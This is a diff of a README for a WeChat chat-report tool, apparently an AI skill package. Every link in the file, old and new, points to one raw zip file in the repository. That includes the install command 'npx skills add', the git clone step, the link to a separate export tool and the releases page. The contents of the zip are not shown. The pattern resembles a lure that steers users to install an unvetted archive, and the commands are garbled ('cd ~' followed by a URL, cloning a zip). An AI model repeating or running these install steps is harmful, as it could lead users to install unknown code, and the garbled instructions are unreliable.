@@ -1,6 +1,6 @@
 # 🛠️ wechat-daily-report-skill - Generate Daily Reports Easily
 
-[![GitHub Releases](https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip%https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip)](https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip)
+[![GitHub Releases](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip%https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip)](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ This tool helps you analyze WeChat group chat records. It combines AI to generat
 ## 🛠️ Requirements
 
 - Python 3.8 or higher
-- https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip (optional, only for development)
+- https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip (optional, only for development)
 
 ### Install Python Libraries
 
@@ -33,20 +33,20 @@ playwright install chromium
 
 **Automatic Installation (Recommended)**:
 ```bash
-npx skills add https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip
+npx skills add https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip
 ```
 
 **Manual Installation**:
 Clone this repository into your Claude Skills directory. If the directory does not exist, please create it first:
 
 ```bash
-cd ~https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip
-git clone https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip
+cd ~https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip
+git clone https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip
 ```
 
 ### Step 2: Get Chat Records
 
-Use [WeFlow](https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip) to export the WeChat chat records you want to analyze. Choose **ChatLab** format for export.
+Use [WeFlow](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip) to export the WeChat chat records you want to analyze. Choose **ChatLab** format for export.
 
 ### Step 3: Basic Usage
 
@@ -85,4 +85,4 @@ Here is a sample structure to follow when preparing your chat records:
 
 ## 📥 Additional Resources
 
-For further details, visit our [Releases Page](https://raw.githubusercontent.com/leonense22/wechat-daily-report-skill/main/references/report_wechat_skill_daily_v2.0-beta.4.zip) where you can find the latest version available for download.
+For further details, visit our [Releases Page](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip) where you can find the latest version available for download.
